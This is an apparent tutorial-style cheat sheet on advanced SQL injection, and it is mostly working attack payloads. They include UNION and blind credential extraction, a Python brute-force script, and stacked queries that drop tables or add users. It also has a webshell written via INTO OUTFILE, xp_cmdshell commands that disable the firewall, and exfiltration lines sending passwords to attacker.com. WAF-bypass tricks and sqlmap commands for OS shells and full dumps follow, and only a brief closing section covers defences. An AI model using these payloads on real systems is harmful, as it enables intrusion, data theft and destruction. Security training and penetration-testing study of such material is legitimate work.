🧠 Advanced SQL Injection Overview

Beyond basic error-based injection, advanced SQL injection techniques enable attackers to extract data without visible output, escalate to OS command execution, and pivot to internal networks.

Why Learn Advanced Techniques?
  • Blind Environments: No visible SQL errors, no database output displayed
  • WAF Bypass: Bypass web application firewalls and filters
  • Full Compromise: Achieve RCE and network pivoting
  • Second-Order: Attack stored payloads executed later

📊 Advanced UNION-Based Injection

Column Detection with NULL:

# Standard NULL test
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
# Continue until no error

# Quick check for column count
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--  # Error = 2 columns

Data Type Identification:

# Test data types with NULL substitution
' UNION SELECT NULL,'a',NULL--
' UNION SELECT 1,'a',3--
' UNION SELECT @@version,user(),database()--

# MySQL specific
' UNION SELECT 1,table_name,3 FROM information_schema.tables--
' UNION SELECT table_name,column_name,4 FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT username,password,3 FROM users--

Extracting Multiple Values:

# Concatenate output
' UNION SELECT CONCAT(username,'|',password),2,3 FROM users--

# MySQL GROUP_CONCAT for large datasets
' UNION SELECT GROUP_CONCAT(username,0x3a,password),2,3 FROM users--

# Hex encoding for special characters
' UNION SELECT HEX(username),HEX(password) FROM users--

# Using LIMIT/OFFSET for pagination
' UNION SELECT username,password,3 FROM users LIMIT 0,1--
' UNION SELECT username,password,3 FROM users LIMIT 1,1--

👻 Blind Boolean-Based Injection

Detection Techniques:

# True condition (page loads normally)
' OR '1'='1
' OR 1=1--
admin' AND 1=1--

# False condition (different page/content)
' OR '1'='2
' OR 1=2--
admin' AND 1=2--

# Using SUBSTRING
admin' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--

Binary Search for Fast Extraction:

# Binary search algorithm for character extraction
# Check if ASCII value > 64 (uppercase letter)
admin' AND ASCII(SUBSTRING(password,1,1)) > 64--
admin' AND ASCII(SUBSTRING(password,1,1)) > 96--  # lowercase
admin' AND ASCII(SUBSTRING(password,1,1)) > 108--  # continue...

# Alternative: BETWEEN for character ranges
admin' AND SUBSTRING(password,1,1) BETWEEN 'a' AND 'z'--
admin' AND SUBSTRING(password,1,1) BETWEEN 'A' AND 'Z'--
admin' AND SUBSTRING(password,1,1) BETWEEN '0' AND '9'--

Python Script for Automation:

#!/usr/bin/env python3
import requests
import string

charset = string.ascii_lowercase + string.ascii_uppercase + string.digits
url = "http://target.com/search"
password = ""

for pos in range(1, 33):  # 32 chars for MD5
    for char in charset:
        payload = f"admin' AND SUBSTRING(password,{pos},1)='{char}'--"
        r = requests.get(url, params={"q": payload})
        if "Welcome" in r.text:  # True condition
            password += char
            print(f"Found: {password}")
            break

print(f"Password: {password}")

⏱️ Time-Based Blind Injection

MySQL Time-Based:

# Basic delay
' AND SLEEP(5)--
1' AND SLEEP(5)--
1" AND SLEEP(5)--

# IF-based condition (returns 1 after delay)
' AND IF(1=1, SLEEP(5), 0)--
' AND IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0)--

MSSQL Time-Based:

# WAITFOR DELAY
'; WAITFOR DELAY '00:00:05'--
1; WAITFOR DELAY '00:00:05'--

# Conditional delay
1'; IF(1=1) WAITFOR DELAY '00:00:05'--
1'; IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a') WAITFOR DELAY '00:00:05'--

PostgreSQL Time-Based:

# pg_sleep
'; SELECT pg_sleep(5)--
1' AND pg_sleep(5)--

# Using CASE
1'; CASE WHEN (SUBSTRING(password,1,1)='a') THEN pg_sleep(5) ELSE NULL END--

Oracle Time-Based:

# DBMS_LOCK.SLEEP
'; BEGIN DBMS_LOCK.SLEEP(5); END;--

# Using utl_http (network call instead)
'; SELECT UTL_HTTP.REQUEST('http://attacker.com?c='||password) FROM dual--

Heavy Query for Detection:

# MySQL BENCHMARK (CPU intensive)
1' AND BENCHMARK(5000000,SHA1('test'))--

# PostgreSQL generate_series
1'; SELECT * FROM generate_series(1,10000000);--

📚 Stacked Queries

Multiple Statements:

# MSSQL (most reliable)
1; DROP TABLE users--
1; SELECT * FROM users; INSERT INTO users VALUES ('hacker','password')--
1; EXEC xp_cmdshell 'whoami'--

# MySQL (depends on driver configuration)
1; DROP TABLE users--
1; SELECT * FROM users; SET @x=0--

# PostgreSQL
1; DROP TABLE users--
1; SELECT * FROM users; CREATE TABLE pwn(id int);--

MySQL INTO OUTFILE:

# Write webshell
' UNION SELECT '' INTO OUTFILE '/var/www/html/shell.php'--

# Alternative using hex encoding
' UNION SELECT 0x3c3f7068702073797374656d28245f4745545b22636d64225d293b3f3e INTO OUTFILE '/var/www/html/shell.php'--

# Write file with newline (for multiple commands)
' UNION SELECT '' INTO OUTFILE '/var/www/html/shell.php'--

MSSQL xp_cmdshell:

# Enable xp_cmdshell if disabled
1; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--

# Execute commands
1; EXEC xp_cmdshell 'whoami';--
1; EXEC xp_cmdshell 'net user hacker Password123 /add';--
1; EXEC xp_cmdshell 'netsh firewall set service type=disable';--

🌐 Out-of-Band (OAST) Injection

DNS Exfiltration (MSSQL):

# DNS lookup to attacker server
1'; DECLARE @x VARCHAR(100); SET @x='\\'+SELECT password FROM users WHERE username='admin'+'.attacker.com\\test'; EXEC('master..xp_fileexist @x');--

# Using stored procedures
1'; DECLARE @host VARCHAR(200); SELECT @host=(SELECT password FROM users WHERE username='admin')+'attacker.com'; EXEC('xp_cmdshell ''ping '+@host+'''');--

HTTP Request (Oracle):

# UTL_HTTP for HTTP requests
1'; SELECT UTL_HTTP.REQUEST('http://attacker.com/'||password) FROM users WHERE username='admin';--

# UTL_INADDR for DNS
1'; SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT password FROM users WHERE username='admin')||'.attacker.com') FROM DUAL;--

MySQL LOAD_FILE + HTTP:

# Using sys_exec
1'; SELECT sys_exec('curl http://attacker.com/?p='+(SELECT password FROM users LIMIT 1));--

# Using load_file with HTTP (via PHP wrapper)
' UNION SELECT LOAD_FILE('http://attacker.com/?f=/etc/passwd')--

Burp Collaborator for OAST:

# Generate Collaborator URL in Burp Suite
# Use in payload
1'; SELECT EXTRACTVALUE(1,CONCAT(0x5c,(SELECT password FROM users LIMIT 1)),'http://attacker.com'))--

# Or DNS TXT record
1'; SELECT UTL_HTTP.REQUEST('http://'||(SELECT password FROM users)||'.burpcollaborator.net');--

🛡️ WAF Bypass Techniques

Comment Obfuscation:

# Inline comments (MySQL)
UN/**/ION SEL/**/ECT
/*!UNION*/ /*!SELECT*/
UN/**/ION/**/SELECT/**/NULL

# Version-specific (only executes on specific versions)
/*!50000 UNION*/  # MySQL 5.0.00+

# Chained comments
/**/UNION/**/SELECT/**/

URL Encoding:

# Double URL encode
%2527  (decoded to %27 then to ')
%55NION  (U -> %55)
%20SELECT (space -> %20)

# Unicode encode
\u0055NION  (non-standard but sometimes works)
\u0027 (')

# Mixed encoding
UN%16ION

Case Manipulation:

# Case variation (SQL is case-insensitive)
uNiOn SeLeCt
UNION SELECT
SelEcT

# Mixed case
UnIoN SeLeCt 1,2,3--

Whitespace Alternatives:

# Tab, newline, carriage return
UNION\tSELECT
UNION\nSELECT
UNION%09SELECT
UNION%0aSELECT
UNION%0dSELECT

# Alternative characters
UNION%0bSELECT
UNION%0cSELECT
/**/UNION/**/SELECT/**/

Keyword Replacement Bypass:

# Replace blocked keywords
UNION -> UN\nION (newline breaks detection)
SELECT -> SEL\nECT
OR -> || (logical OR in some contexts)
AND -> && (logical AND)
OR -> ORR (append garbage)

# Using LIKE
' OR username LIKE 'admin'--
' OR password LIKE '%a%'--

HTTP Parameter Pollution:

# Duplicate parameters
id=1 UNION SELECT&id=1 NULL--
id=1 UNION SELECT&id=password FROM users--

# Different encoding per instance
id=1%2527  # first
id=1%27    # second

🔧 SQLMap Advanced Usage

Technique Selection:

# Specify technique (B=Boolean, E=Error-based, U=Union, S=Stacked, T=Time-based)
sqlmap -u "http://target.com/?id=1" --technique=U
sqlmap -u "http://target.com/?id=1" --technique=B
sqlmap -u "http://target.com/?id=1" --technique=T

# All techniques with delay
sqlmap -u "http://target.com/?id=1" --technique=T --time-sec=10

# Stacked queries (MySQL)
sqlmap -u "http://target.com/?id=1" --technique=S
sqlmap -u "http://target.com/?id=1" --dbms=mysql --batch

Level/Risk Tuning:

# Level 1-5 (payload variations)
sqlmap -u "http://target.com/?id=1" --level=5

# Risk 1-3 (aggressive payloads)
sqlmap -u "http://target.com/?id=1" --risk=3

# Combined (max coverage)
sqlmap -u "http://target.com/?id=1" --level=5 --risk=3

WAF Bypass with Tamper Scripts:

# Multiple tamper scripts
sqlmap -u "http://target.com/?id=1" --tamper=space2comment,randomcase,charencode

# Available tamperp scripts:
# space2comment     - Replace space with /**/
# between           - Replace > with BETWEEN
# charencode        - URL encode characters
# randomcase        - Random case variation
# space2dash        - Replace space with --
# logicalbypass     - Replace AND/OR with &&/||
# space2hash        - Replace space with ###
# charunicodeencode - Unicode encode
# space2plus        - Replace space with +

# Custom tamper (save as mytamper.py)
sqlmap -u "http://target.com/?id=1" --tamper=mytamper.py

Shell Access:

# OS shell
sqlmap -u "http://target.com/?id=1" --os-shell

# OS command execution
sqlmap -u "http://target.com/?id=1" --os-cmd="whoami"

# SQL shell (interactive)
sqlmap -u "http://target.com/?id=1" --sql-shell

# Interactive Metasploit
sqlmap -u "http://target.com/?id=1" --priv-esc  # Windows only

Data Extraction:

# Dump all databases
sqlmap -u "http://target.com/?id=1" --dump-all

# Specific table
sqlmap -u "http://target.com/?id=1" -D database -T users --dump

# Search for password columns
sqlmap -u "http://target.com/?id=1" --search -C password

# Read file from system
sqlmap -u "http://target.com/?id=1" --file-read="/etc/passwd"

🛡️ Defense Against SQL Injection

✅ Primary Defense - Parameterized Queries: 
# PHP (PDO)
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username");
$stmt->execute(['username' => $user]);

# Java (PreparedStatement)
PreparedStatement ps = conn.prepareStatement(
    "SELECT * FROM users WHERE username = ?");
ps.setString(1, username);

# Python (psycopg2)
cursor.execute("SELECT * FROM users WHERE username = %s", (username,))

# Node.js (parameterized)
db.query('SELECT * FROM users WHERE username = $1', [username])

Additional Mitigations:

  • Input Validation: Whitelist validation, type checking
  • Least Privilege: Database accounts with minimal permissions
  • Web Application Firewall: ModSecurity, Cloudflare, AWS WAF
  • Error Handling: Generic error messages, no stack traces
  • HTTPS Only: Encrypt all database communications
  • Regular Audits: Code reviews, penetration testing
